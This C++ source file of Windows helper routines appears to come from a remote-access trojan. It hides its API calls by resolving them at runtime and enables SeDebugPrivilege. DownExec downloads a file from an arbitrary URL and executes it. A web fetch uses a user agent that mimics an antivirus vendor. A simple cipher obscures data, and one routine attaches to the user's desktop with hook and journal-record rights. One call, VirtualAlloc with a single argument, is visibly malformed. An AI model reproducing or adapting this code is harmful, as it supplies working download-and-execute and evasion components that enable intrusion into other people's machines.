#include "StdAfx.h"
#include "Functions.h"

BOOL IsX64System()
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL(WINAPI *ISWOW64PROCESS)(HANDLE, PBOOL);
	ISWOW64PROCESS pfnIsWow64 = (ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process");
	if (pfnIsWow64)
	{
		if (!pfnIsWow64(GetCurrentProcess(), &bIsWow64))
		{
			// handle error
		}
	}

	return bIsWow64;
}

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
	unsigned char p = (unsigned char)key % 254 + 1;

	for (unsigned long i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec += 1;
	}
}

void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
	unsigned char p = (unsigned char)key % 254 + 1;

	for (unsigned long i = 0; i < nLen; i++)
	{
		*szRec -= p;
		*szRec++ ^= p;
	}
}

BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) == 0)
	{
		return FALSE;
	}

	LookupPrivilegeValue(NULL, lpszPrivilege, &tp.Privileges[0].Luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}

int GrantPrivilege()
{
	return SetPrivilege(SE_DEBUG_NAME);
}

char* GetHttpFile(char Url[])
{
	char *buf = (PCHAR)VirtualAlloc(10240);
	DWORD dwFlags;

	HMODULE hDll = LoadLibraryW(L"wininet.dll");
	if (hDll)
	{
		typedef LPVOID(WINAPI * pInternetOpen) (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
		typedef LPVOID(WINAPI * pInternetOpenUrl) (LPVOID, LPCSTR, LPCSTR, DWORD, DWORD, DWORD);
		typedef BOOL(WINAPI * pInternetCloseHandle) (LPVOID);
		typedef BOOL(WINAPI * pInternetReadFile) (LPVOID, LPVOID, DWORD, LPDWORD);
		pInternetOpen InternetOpen = (pInternetOpen)GetProcAddress(hDll, "InternetOpenA");
		pInternetOpenUrl InternetOpenUrl = (pInternetOpenUrl)GetProcAddress(hDll, "InternetOpenUrlA");
		pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hDll, "InternetCloseHandle");
		pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hDll, "InternetReadFile");

		LPVOID hInternet = InternetOpen("RiSing", 0, NULL, NULL, 0);
		if (hInternet != NULL)
		{
			LPVOID hUrlHandle = InternetOpenUrl(hInternet, Url, NULL, 0, 0x04000000, 0);
			if (hUrlHandle != NULL)
			{
				memset(buf, 0, 10240);
				InternetReadFile(hUrlHandle, buf, 10240, &dwFlags);
			}
			InternetCloseHandle(hInternet);
		}
		FreeLibrary(hDll);
		return buf;
	}

	return NULL;
}

void DownExec(char url[])
{
	HMODULE hurlmon = LoadLibraryW(L"urlmon.dll");
	HMODULE hwininet = LoadLibraryW(L"wininet.dll");

	void (WINAPI *DOWNFILE)  (void*, LPCSTR, LPCSTR, DWORD, DWORD, void*);
	BOOL(WINAPI * CACHEINFO) (LPCSTR, LPINTERNET_CACHE_ENTRY_INFO, LPDWORD);
	(FARPROC&)DOWNFILE = GetProcAddress(hurlmon, "URLDownloadToCacheFileA");
	(FARPROC&)CACHEINFO = GetProcAddress(hwininet, "GetUrlCacheEntryInfoA");

	DOWNFILE(NULL, url, "c:\\1.exe", 10, 0, NULL);

	DWORD dwEntrySize = 0;
	char strTemp[255];
	if (!CACHEINFO(url, NULL, &dwEntrySize))
	{
		LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)new char[dwEntrySize];
		if (CACHEINFO(url, lpCacheEntry, &dwEntrySize))
		{
			ZeroMemory(strTemp, 255);
			lstrcpynA(strTemp, lpCacheEntry->lpszLocalFileName, strlen(lpCacheEntry->lpszLocalFileName));

			WinExec(strTemp, SW_SHOW);
		}
	}
	FreeLibrary(hurlmon);
	FreeLibrary(hwininet);
}

void OpenUrl(char url[])
{
	HMODULE hshell = LoadLibraryW(L"Shell32.dll");
	HINSTANCE(WINAPI *SHELLRUN)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, int);

	(FARPROC&)SHELLRUN = GetProcAddress(hshell, "ShellExecuteA");

	SHELLRUN(GetDesktopWindow(), "open", url, NULL, NULL, 5);
	FreeLibrary(hshell);
}

BOOL OpenUserDesktop()
{
	HWINSTA hwinstaCurrent = GetProcessWindowStation();
	if (hwinstaCurrent == NULL)
		return FALSE;

	HDESK hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
	if (hdeskCurrent == NULL)
		return FALSE;

	HWINSTA hwinsta = OpenWindowStation(_T("winsta0"), FALSE,
		WINSTA_ACCESSCLIPBOARD |
		WINSTA_ACCESSGLOBALATOMS |
		WINSTA_CREATEDESKTOP |
		WINSTA_ENUMDESKTOPS |
		WINSTA_ENUMERATE |
		WINSTA_EXITWINDOWS |
		WINSTA_READATTRIBUTES |
		WINSTA_READSCREEN |
		WINSTA_WRITEATTRIBUTES);
	if (hwinsta == NULL)
		return FALSE;

	if (!SetProcessWindowStation(hwinsta))
		return FALSE;

	HDESK hdesk = OpenDesktop(_T("default"), 0, FALSE,
		DESKTOP_CREATEMENU |
		DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE |
		DESKTOP_HOOKCONTROL |
		DESKTOP_JOURNALPLAYBACK |
		DESKTOP_JOURNALRECORD |
		DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP |
		DESKTOP_WRITEOBJECTS);
	if (hdesk == NULL)
		return FALSE;

	SetThreadDesktop(hdesk);

	return TRUE;
}
